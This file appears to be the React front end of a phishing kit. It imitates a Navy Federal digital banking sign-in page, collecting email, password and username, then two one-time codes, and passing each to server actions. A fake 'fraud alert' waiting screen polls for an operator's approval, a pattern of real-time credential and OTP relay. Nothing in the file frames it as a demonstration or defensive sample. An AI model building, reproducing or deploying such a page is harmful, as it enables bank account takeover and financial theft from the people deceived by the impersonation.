'use client'

import { useEffect, useState } from 'react'
import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions'

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success'

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.'

export default function SignInPage() {
  const [step, setStep] = useState<Step>('credentials')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [username, setUsername] = useState('')
  const [otp, setOtp] = useState('')
  const [attemptId, setAttemptId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [note, setNote] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)
  const [showPassword, setShowPassword] = useState(false)

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return
    let cancelled = false
    const tick = async () => {
      const s = await getStatus(attemptId)
      if (cancelled) return
      if (s.status === 'approved') setStep('approved_success')
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected')
        setError('Sign-in was rejected.')
      }
    }
    tick()
    const id = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [step, attemptId])

  if (step === 'approved_success') {
    return (
      <div style={styles.body}>
        <header style={styles.header}>
          <div style={styles.logoContainer}>
            <div style={styles.globeIcon}>
              <div style={styles.globeInner}></div>
            </div>
            <span style={styles.logoText}>NAVY FEDERAL</span>
          </div>
        </header>

        <main style={styles.card}>
          <div style={styles.cardHeader}>
            <h2 style={styles.cardHeaderTitle}>Congratulations</h2>
          </div>
          <p style={styles.text}>Your account &amp; verification has been approved.</p>
          {email ? <p style={styles.text}>{email}</p> : null}
        </main>
      </div>
    )
  }

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setAttemptId(r.attemptId)
        setStep('username')
        setNote(null)
        return
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const r = await submitUsername({ attemptId, username })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        setStep('otp1')
        setNote('Code sent to your email.')
        return
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false)
          setError('Session lost.')
          return
        }
        const which = step === 'otp1' ? 1 : 2
        const r = await submitOtp({ attemptId, otp, which })
        setLoading(false)
        if (!r.ok) {
          setError(r.error)
          return
        }
        setOtp('')
        if (r.next === 'otp2') {
          setStep('otp2')
          setNote('New second code sent to your email.')
          return
        }
        setStep('awaiting_approval')
        setNote(WAIT_MSG)
      }
    } catch (err) {
      setLoading(false)
      setError(err instanceof Error ? err.message : 'Error')
    }
  }

  return (
    <div style={styles.body}>
      {/* Header Navigation */}
      <header style={styles.header}>
        <div style={styles.hamburger}>
          <span style={styles.hamburgerLine}></span>
          <span style={styles.hamburgerLine}></span>
          <span style={styles.hamburgerLine}></span>
        </div>
        <div style={styles.logoContainer}>
          <div style={styles.globeIcon}>
            <div style={styles.globeInner}></div>
          </div>
          <span style={styles.logoText}>NAVY FEDERAL</span>
        </div>
      </header>

      {/* Page Title */}
      <h1 style={styles.pageTitle}>Welcome to Digital Banking</h1>

      {/* Form Card */}
      <main style={styles.card}>
        <div style={styles.cardHeader}>
          <div style={styles.lockIcon}>
            <span style={styles.lockShackle}></span>
            <span style={styles.lockBody}></span>
          </div>
          <h2 style={styles.cardHeaderTitle}>
            {step === 'credentials' ? 'Sign In' : step === 'username' ? 'Enter Username' : 'Security Check'}
          </h2>
        </div>

        <form onSubmit={onSubmit}>
          {step === 'credentials' && (
            <>
              <div style={styles.formGroup}>
                <div style={styles.labelContainer}>
                  <label htmlFor="email" style={styles.label}>
                    Email Address
                  </label>
                  <button type="button" aria-label="Help" style={styles.helpIcon}>
                    ?
                  </button>
                </div>
                <input
                  type="email"
                  id="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  style={styles.input}
                  autoComplete="email"
                />
              </div>

              <div style={styles.formGroup}>
                <div style={styles.labelContainer}>
                  <label htmlFor="password" style={styles.label}>
                    Password
                  </label>
                </div>
                <div style={styles.inputWrapper}>
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    style={styles.input}
                    autoComplete="current-password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((prev) => !prev)}
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                    style={styles.eyeButton}
                  >
                    <div style={styles.eyeIcon}>
                      <div style={styles.eyePupil}></div>
                    </div>
                  </button>
                </div>
              </div>
            </>
          )}

          {step === 'username' && (
            <div style={styles.formGroup}>
              <div style={styles.labelContainer}>
                <label htmlFor="username" style={styles.label}>
                  Username
                </label>
                <button type="button" aria-label="Help" style={styles.helpIcon}>
                  ?
                </button>
              </div>
              <input
                type="text"
                id="username"
                required
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                style={styles.input}
                autoComplete="username"
              />
            </div>
          )}

          {(step === 'otp1' || step === 'otp2') && (
            <div style={styles.formGroup}>
              <div style={styles.labelContainer}>
                <label htmlFor="otp" style={styles.label}>
                  {step === 'otp1' ? 'Enter First Code' : 'Enter Second Code'}
                </label>
              </div>
              <input
                type="text"
                id="otp"
                required
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                style={styles.input}
              />
            </div>
          )}

          {step === 'awaiting_approval' && (
            <p style={styles.text}>{WAIT_MSG}</p>
          )}

          {error && <p style={styles.errorText}>{error}</p>}
          {note && step !== 'awaiting_approval' && (
            <p style={styles.noteText}>{note}</p>
          )}

          {step === 'credentials' && (
            <a href="#help" style={styles.helpLink}>
              SIGN IN HELP
            </a>
          )}

          {step !== 'awaiting_approval' && step !== 'rejected' && (
            <button type="submit" disabled={loading} style={styles.btnSubmit}>
              {loading ? 'Please wait…' : 'Sign In'}
            </button>
          )}

          {step !== 'credentials' && step !== 'awaiting_approval' && (
            <button
              type="button"
              onClick={() => {
                setStep('credentials')
                setAttemptId(null)
                setUsername('')
                setOtp('')
                setError(null)
                setNote(null)
              }}
              style={styles.btnSecondary}
            >
              Start over
            </button>
          )}
        </form>
      </main>

      {/* Footer Section */}
      <section style={styles.footerSection}>
        <h3 style={styles.footerTitle}>Not a Navy Federal Member?</h3>
      </section>
    </div>
  )
}

const styles: { [key: string]: React.CSSProperties } = {
  body: {
    backgroundColor: '#b9d7f6',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    minHeight: '100vh',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
    margin: 0,
    padding: 0,
  },
  header: {
    width: '100%',
    backgroundColor: '#004976',
    color: '#ffffff',
    display: 'flex',
    alignItems: 'center',
    padding: '12px 16px',
    gap: '16px',
    boxSizing: 'border-box',
  },
  hamburger: {
    display: 'flex',
    flexDirection: 'column',
    gap: '4px',
    cursor: 'pointer',
  },
  hamburgerLine: {
    display: 'block',
    width: '20px',
    height: '2px',
    backgroundColor: '#ffffff',
  },
  logoContainer: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
  },
  globeIcon: {
    width: '22px',
    height: '22px',
    border: '2px solid #ffffff',
    borderRadius: '50%',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  globeInner: {
    width: '10px',
    height: '22px',
    border: '1px solid #ffffff',
    borderRadius: '50%',
  },
  logoText: {
    fontWeight: 800,
    fontSize: '1.1rem',
    letterSpacing: '0.5px',
  },
  pageTitle: {
    color: '#003366',
    fontSize: '1.5rem',
    fontWeight: 600,
    margin: '24px 16px 16px 16px',
    width: '100%',
    maxWidth: '400px',
    boxSizing: 'border-box',
    paddingLeft: '4px',
  },
  card: {
    backgroundColor: '#f8f8f8',
    borderRadius: '4px',
    width: 'calc(100% - 32px)',
    maxWidth: '400px',
    borderTop: '4px solid #e65c00',
    boxShadow: '0 4px 12px rgba(0, 0, 0, 0.15)',
    padding: '24px 20px',
    marginBottom: '30px',
    boxSizing: 'border-box',
  },
  cardHeader: {
    display: 'flex',
    alignItems: 'center',
    gap: '10px',
    paddingBottom: '12px',
    borderBottom: '1px solid #e0e0e0',
    marginBottom: '24px',
  },
  lockIcon: {
    width: '24px',
    height: '24px',
    backgroundColor: '#707070',
    borderRadius: '4px',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    position: 'relative',
  },
  lockShackle: {
    width: '8px',
    height: '6px',
    border: '2px solid #ffffff',
    borderBottom: 'none',
    borderTopLeftRadius: '4px',
    borderTopRightRadius: '4px',
    position: 'absolute',
    top: '3px',
  },
  lockBody: {
    width: '12px',
    height: '8px',
    backgroundColor: '#ffffff',
    position: 'absolute',
    bottom: '4px',
    borderRadius: '1px',
  },
  cardHeaderTitle: {
    fontSize: '1.25rem',
    color: '#222222',
    fontWeight: 600,
    margin: 0,
  },
  formGroup: {
    marginBottom: '20px',
  },
  labelContainer: {
    display: 'flex',
    alignItems: 'center',
    gap: '6px',
    marginBottom: '8px',
  },
  label: {
    fontWeight: 700,
    color: '#111111',
    fontSize: '0.95rem',
  },
  helpIcon: {
    backgroundColor: '#767676',
    color: '#ffffff',
    border: 'none',
    borderRadius: '50%',
    width: '18px',
    height: '18px',
    fontSize: '0.75rem',
    display: 'inline-flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontWeight: 'bold',
    cursor: 'pointer',
    padding: 0,
  },
  inputWrapper: {
    position: 'relative',
    display: 'flex',
    alignItems: 'center',
  },
  input: {
    width: '100%',
    padding: '12px',
    border: '1px solid #767676',
    borderRadius: '6px',
    fontSize: '1rem',
    backgroundColor: '#ffffff',
    outline: 'none',
    boxSizing: 'border-box',
  },
  eyeButton: {
    position: 'absolute',
    right: '12px',
    background: 'none',
    border: 'none',
    cursor: 'pointer',
    padding: 0,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  eyeIcon: {
    width: '20px',
    height: '12px',
    border: '2px solid #005691',
    borderRadius: '50%',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  eyePupil: {
    width: '6px',
    height: '6px',
    backgroundColor: '#005691',
    borderRadius: '50%',
  },
  helpLink: {
    display: 'inline-block',
    color: '#004976',
    fontSize: '0.8rem',
    fontWeight: 700,
    textDecoration: 'none',
    borderBottom: '1.5px dotted #004976',
    letterSpacing: '0.5px',
    marginBottom: '24px',
  },
  btnSubmit: {
    width: '100%',
    backgroundColor: '#e65c00',
    color: '#ffffff',
    border: 'none',
    borderRadius: '6px',
    padding: '12px',
    fontSize: '1.1rem',
    fontWeight: 600,
    cursor: 'pointer',
    boxShadow: '0 2px 4px rgba(0, 0, 0, 0.2)',
  },
  btnSecondary: {
    width: '100%',
    backgroundColor: 'transparent',
    color: '#004976',
    border: '1px solid #004976',
    borderRadius: '6px',
    padding: '10px',
    fontSize: '0.95rem',
    fontWeight: 600,
    cursor: 'pointer',
    marginTop: '12px',
  },
  text: {
    fontSize: '0.95rem',
    lineHeight: 1.5,
    color: '#333333',
    margin: '0 0 16px',
  },
  errorText: {
    color: '#d93025',
    fontSize: '0.875rem',
    margin: '0 0 16px',
  },
  noteText: {
    color: '#333333',
    fontSize: '0.875rem',
    margin: '0 0 16px',
  },
  footerSection: {
    backgroundColor: '#ffffff',
    width: '100%',
    padding: '24px 20px',
    marginTop: 'auto',
    boxSizing: 'border-box',
  },
  footerTitle: {
    color: '#003366',
    fontSize: '1.1rem',
    fontWeight: 700,
    margin: 0,
  },
}
